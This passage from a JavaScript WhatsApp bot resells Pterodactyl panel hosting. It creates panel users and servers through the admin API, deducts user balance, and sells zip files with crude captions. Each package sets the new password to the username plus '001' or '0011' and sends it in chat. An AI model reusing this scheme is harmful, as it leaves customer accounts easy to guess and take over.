let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
        break
             case "addsrv2": {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
        break
case "buyapipm2": {
  if (cekSaldo(sender,db_saldo) < 35000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp35.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/apipm2.zip'), caption: 'Nih Yapit, Kau Jual Murah Awas Kontol', mimetype: 'application/zip', fileName: 'apipm2.zip'}, {quoted: m})
minSaldo(sender, 35000, db_saldo)
}
break
case "buyeggpm2": {
  if (cekSaldo(sender,db_saldo) < 30000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/pm2.json'), caption: 'Egg Pm2', mimetype: 'application/json', fileName: 'pm2.json'}, {quoted: m})
minSaldo(sender, 30000, db_saldo)
}
break
case "buycasepm2": {
  if (cekSaldo(sender,db_saldo) < 45000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp45.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
Biiofc.sendMessage(from, {document: fs.readFileSync('./freya/caseaddpm2.zip'), caption: 'Nih Kontol, Kau Jual Murah Ku Delete!', mimetype: 'application/zip', fileName: 'caseaddpm2.zip'}, {quoted: m})
minSaldo(sender, 45000, db_saldo)
}
break
        case "srvpaket1": {
       if (cekSaldo(sender,db_saldo) < 3000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp3.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By OktzOffc"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "30"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`DONE BY OKTZOFFC⚡

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

╔┈┈┈「INFO PANEL」┈┈┈
╎ *👤USERNAME* : ${user.username}
 ╎*🔐PASSWORD* : ${password}
╎ *🌐LOGIN* : ${domain}
 ╎*😎PEMILIK SERVER* : *${namaCreator}*
╚┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
`)

}
minSaldo(sender, 3000, db_saldo)
break
case "srvpaket2": {
       if (cekSaldo(sender,db_saldo) < 4000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By OktzOffc"
let egg = global.eggsnya
let loc = global.location
let memo = "2000"
let cpu = "60"
let disk = "0"
let email = username + "@OktzOffc.com"
akunlo = "https://telegra.ph/file/fed0dfec749f90cb6c61a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 4000, db_saldo)
break
case "srvpaket3": {
       if (cekSaldo(sender,db_saldo) < 6000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp6.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By OktzOffc"
let egg = global.eggsnya
let loc = global.location
let memo = "3000"
let cpu = "80"
let disk = "0"
let email = username + "@OktzOffc.com"
akunlo = "https://telegra.ph/file/fed0dfec749f90cb6c61a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 6000, db_saldo)
break
case "srvpaket4": {
       if (cekSaldo(sender,db_saldo) < 8000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp8.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
       
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By De4you"
let egg = global.eggsnya
let loc = global.location
let memo = "4000"
let cpu = "100"
let disk = "0"
let email = username + "@OktzOffc"
akunlo = "https://telegra.ph/file/fed0dfec749f90cb6c61a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 8000, db_saldo)
break
case "srvpaket5": {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By De4you"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "500"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@Zamzz127

*GRUP OWNER :*
https://chat.whatsapp.com/DnqpNlCW6fCBhkMERej87f

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 10000, db_saldo)
break
case "srvpaket6": {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
       
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By De4you"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@Zamzz127

*GRUP OWNER :*
https://chat.whatsapp.com/DnqpNlCW6fCBhkMERej87f

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 20000, db_saldo)
break
case "srvpaket7": {
       if (cekSaldo(sender,db_saldo) < 12000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp12.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By De4you"
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "450"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@Zamzz127

*GRUP OWNER :*
https://chat.whatsapp.com/DnqpNlCW6fCBhkMERej87f

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
